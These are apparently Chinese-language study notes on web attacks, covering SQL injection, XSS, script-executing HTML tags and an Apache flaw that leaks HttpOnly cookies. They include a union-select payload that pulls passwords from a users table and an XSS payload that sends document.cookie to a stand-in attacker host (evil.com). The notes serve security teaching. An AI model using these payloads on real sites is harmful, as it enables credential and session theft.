### Sql注入攻击
````javascript
http://www.foo.com/user.php?id=1
get请求目地：
  select username,email,desc1 from users where id=1;

攻击：
  http://www.foo.com/user.php?id=1 union select password,1,1 from users;
````
### XSS跨站脚本攻击
````javascript
前端解析location参数
<script>
eval( location.hash.substr(1) ); // 获取#符号后面的内容
</script>

攻击：
  http://www.foo.com/info.html#new%20Image().src="http://www.evil.com/steal.php?c="+escape(document.cookie);

诱骗用户点击之后，用户所在的网站解析参数
然后加载图片，发起get请求"http://www.evil.com/steal.php?c="+escape(document.cookie)
````
### HTML内嵌脚本执行 `能执行js的位置越多，意味着XSS发生的面越广，XSS漏洞出现的可能性越大`
````javascript
js脚本除了执行在JS格式的文件里，还可以出现在HTML的很多标签中，如下：
<script>alert(1)</script>
<img src=# onerror="alert(1)">
<input type="text" value="x" onmouseover="alert(1)" />
<iframe src="javascript:alert(1)"></iframe>
<a href="javascript:alert(1)">x</a>
````
### CSRF攻击
### cookies攻击
````txt
大多数浏览器限制Cookies最大为4kb
Apache Http Server 400错误暴露HttpOnly Cookie
Apache Http Server请求头信息超过LimitRequestFieldSize长度时，服务器返回400（Bad Request），并在返回信息中将出错的请求头内容输出（包含请求头里的 HttpOnly Cookie），
攻击者可以利用这个缺陷获取HttpOnly Cookie
````
